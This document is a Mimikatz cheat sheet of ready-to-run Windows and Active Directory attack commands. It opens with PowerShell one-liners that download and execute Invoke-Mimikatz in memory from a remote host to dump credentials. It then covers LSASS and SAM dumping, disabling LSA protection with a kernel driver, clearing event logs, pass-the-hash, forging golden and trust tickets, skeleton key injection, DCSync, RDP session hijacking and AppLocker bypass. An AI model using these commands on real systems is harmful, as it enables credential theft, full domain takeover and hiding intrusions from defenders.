# Mimikatz Cheat sheet

## <mark style="color:red;">Loading Mimikatz</mark>

Loading the Script in Memory with PS from localhost:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/im.ps1') ; Invoke-Mimikatz -DumpCreds
```

Loading the Script in Memory with PS from GitHub repo:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’) ; Invoke-Mimikatz -DumpCreds
```

Loading the Script in Disk with PS:

```powershell
Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1 -Verbose
```

running remotely (on the same powershell session)

```powershell
Invoke-Mimikatz -Command '"sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords"'
```

## <mark style="color:red;">Commands</mark>

### <mark style="color:orange;">bypass memory protections</mark>&#x20;

```tsconfig
privilege::debug
token::elevate
```

### <mark style="color:orange;">Disable PPL (LSA protection)</mark>

PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the target process. If we could obtain code execution in kernel space, we could disable the LSA protection and dump the credentials..

this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver.

We must be local administrator or SYSTEM to dump the credentials, which means we will also have the SeLoadDriverPrivilege privilege and the ability to load any signed drivers. Mimikatz can load the mimidrv.sys driver with the !+ command:

```tsconfig
mimikatz # !+
```

Once the driver is loaded, we can use it to disable the PPL protection for LSASS:

```tsconfig
mimikatz # !processprotect /process:lsass.exe /remove
```

{% hint style="danger" %}
While this technique will disable the LSA Protection it does require that we upload the mimidrv.sys driver to the victim machine, which may trigger antivirus.
{% endhint %}

LSA PPL is now disabled:

```tsconfig
mimikatz # sekurlsa::logonpasswords
```

### <mark style="color:orange;">List commands in module</mark>

Just type in the name of the module followed by :: and press enter

```tsconfig
kerberos::
sekurlsa::
```

### <mark style="color:orange;">Base64 output of commands</mark>

```tsconfig
base64 /out:true
base64 /out:false
```

### <mark style="color:orange;">dump the sam file</mark>

```tsconfig
lsadump::sam
lsadump::sam /patch
```

### <mark style="color:orange;">Event</mark>

#### drop new event logs in system

```tsconfig
event::drop
```

#### clear all event logs

```tsconfig
event::clear  
```

### <mark style="color:orange;">lsadump</mark>

```tsconfig
LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.

LSADUMP::Secrets – get the SysKey to decrypt SECRETS entries (from registry or hives).

LSADUMP::SetNTLM – Ask a server to set a new password/ntlm for one user.

​LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
```

### <mark style="color:orange;">sekurlsa</mark>

messing with LSA:

<pre class="language-tsconfig"><code class="lang-tsconfig"># list  LM &#x26; NTLM credentials
mimikatz sekurlsa::msv
<strong>
</strong><strong># Lists WDigest credentials
</strong><strong>mimikatz sekurlsa::wdigest
</strong><strong>
</strong><strong># Lists Kerberos credentials
</strong>mimikatz sekurlsa::kerberos  &#x3C;I've seen this pull plain text passwords>

#  Lists TsPkg credentials
mimikatz sekurlsa::tspkg

# Lists LiveSSP credentials
mimikatz sekurlsa::livessp

# Lists SSP credentials
mimikatz sekurlsa::ssp

#  Lists all available providers credentials
mimikatz sekurlsa::logonPasswords

# Switch (or reinit) to LSASS process  context
<strong>mimikatz sekurlsa::process
</strong>
# Switch (or reinit) to LSASS minidump context
mimikatz sekurlsa::minidump
​
# Antisocial :)
mimikatz sekurlsa::trust

# Preferred Backup Master keys
mimikatz sekurlsa::backupkeys

#  List Kerberos tickets
mimikatz sekurlsa::tickets

#  List Kerberos Encryption Keys
mimikatz sekurlsa::ekeys

#  List Cached MasterKeys
mimikatz sekurlsa::dpapi

# List Credentials Manager
mimikatz sekurlsa::credman

LSADUMP::SAM –> get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.

LSADUMP::Secrets –> get the SysKey to decrypt SECRETS entries (from registry or hives).

LSADUMP::SetNTLM –> Ask a server to set a new password/ntlm for one user.

​LSADUMP::Trust –> Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).</code></pre>

### <mark style="color:orange;">pass the hash</mark>

```tsconfig
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
```

### <mark style="color:orange;">PTH + RDP</mark>

```tsconfig
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

### <mark style="color:orange;">Tokens</mark>

#### show tokens

```tsconfig
#list all
token::list

# important tokens
token::list /user:administrator
token::list /user:domainadmin
token::list /user:enterpriseadmin
token::list /user:system\
```

#### Run process with a token

```tsconfig
token::run /process:cmd.exe
```

#### Get / revert those privileges

```tsconfig
token::revert
token::elevate
```

### <mark style="color:orange;">kerberos</mark>

```tsconfig
KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.
Similar to functionality of “klist”.

KERBEROS::PTC – pass the cache (NT6)
*Nix systems like Mac OS, Linux,BSD, Unix, etc cache Kerberos credentials. This cached data can be copied off and passed using Mimikatz. Also useful for injecting Kerberos tickets in ccache files.

KERBEROS::PTT – pass the ticket
After a Kerberos ticket is found, it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required.
Similar to SEKURLSA::PTH (Pass-The-Hash).
    /filename – the ticket’s filename (can be multiple)
    /diretory – a directory path, all .kirbi files inside will be injected.

KERBEROS::Purge – purge all Kerberos tickets
Similar to functionality of “klist purge”. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.

KERBEROS::TGT – get current TGT for current user.
```

### <mark style="color:orange;">golden/silver tickets</mark>

```tsconfig
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
```

### <mark style="color:orange;">skeleton key</mark>

```tsconfig
MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller.
"privilege::debug" "misc::skeleton"
```

### <mark style="color:orange;">​Trust Ticket​</mark>

Once the Active Directory Trust password hash is determined, a trust ticket can be generated. The trust tickets are created using the shared password between 2 Domains that trust each other.

{% hint style="info" %}
Forge the trust ticket which states the ticket holder is an Enterprise Admin in the AD Forest (leveraging SIDHistory, “sids”, across trusts in Mimikatz, my “contribution” to Mimikatz). This enables full administrative access from a child domain to the parent domain. Note that this account doesn’t have to exist anywhere as it is effectively a Golden Ticket across the trust.
{% endhint %}

```tsconfig
# Dumping trust passwords (trust keys)
Mimikatz “privilege::debug” “lsadump::trust /patch” exit

# Create a forged trust ticket (inter-realm TGT) using Mimikatz
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit


## parameters:

/target – the target domain’s FQDN.

/service – the kerberos service running in the target domain (krbtgt).

/rc4 – the NTLM hash for the service kerberos service account (krbtgt).

/ticket – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.


KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.
Similar to functionality of “klist”.

KERBEROS::PTC – pass the cache (NT6)
*Nix systems like Mac OS, Linux,BSD, Unix, etc cache Kerberos credentials. This cached data can be copied off and passed using Mimikatz. Also useful for injecting Kerberos tickets in ccache files.

KERBEROS::PTT – pass the ticket
After a Kerberos ticket is found, it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required.
Similar to SEKURLSA::PTH (Pass-The-Hash).

/filename – the ticket’s filename (can be multiple)
/diretory – a directory path, all .kirbi files inside will be injected.

KERBEROS::Purge – purge all Kerberos tickets
Similar to functionality of “klist purge”. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.

KERBEROS::TGT – get current TGT for current user.
```

### <mark style="color:orange;">DCShadow / DCSync</mark>

Set the current machines as DC to have the habitability to create new objects inside the DC (persistent method).

```tsconfig
LSADUMP::DCShadow
```

This requires full AD admin rights or KRBTGT pw hash. DCShadow temporarily sets the computer to be a “DC” for the purposes of replication: Creates 2 objects in the AD forest Configuration partition.

ask a DC to synchronize an object (get password data for account) Requires membership in Domain Administrator, domain Administrators, or custom delegation.

```tsconfig
LSADUMP::DCSync
Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt” exit
Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator” exit


# DCSync Options:

/all – DCSync pull data for the entire domain.

/user – user id or SID of the user you want to pull the data for.

/domain (optional) – FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.

/csv – export to csv

/dc (optional) – Specify the Domain Controller you want DCSync to connect to and gather data.
```

### <mark style="color:orange;">NetSync</mark>

NetSync provides a simple way to use a DC computer account password data to impersonate a Domain Controller via a Silver Ticket and DCSync the target account’s information including the password data.

```tsconfig
LSADUMP::NetSync
```

### <mark style="color:orange;">services</mark>

```tsconfig
process::stop /pid:1234
process::suspend /pid:1234
process::resume /pid:1234
```

### <mark style="color:orange;">RDP</mark>

<pre class="language-tsconfig"><code class="lang-tsconfig"># allow multi-session rdp
ts::multirdp
 
# List all current sessions
ts::sessions

# Takeover specified session
ts::remote /id:1

<strong># Pass RDP session into other sessions ID
</strong>ts::remote /id:1 /target:2
<strong>
</strong><strong># Use password of user who owns sessions
</strong>ts::remote /id:1 /password:F@ll2019!</code></pre>

### <mark style="color:orange;">Applocker bypass</mark>

Misc in mimikatz may be able to launch apps blocked by applocker etc.

```tsconfig
misc::cmd
misc::regedit

#  Some kind of filter that can tell if it's running sysmon, kaspersky etc
misc::mflt 

# This will inject into explorer.exe for sneakiness
misc::wp /file:tacos.jpg
```
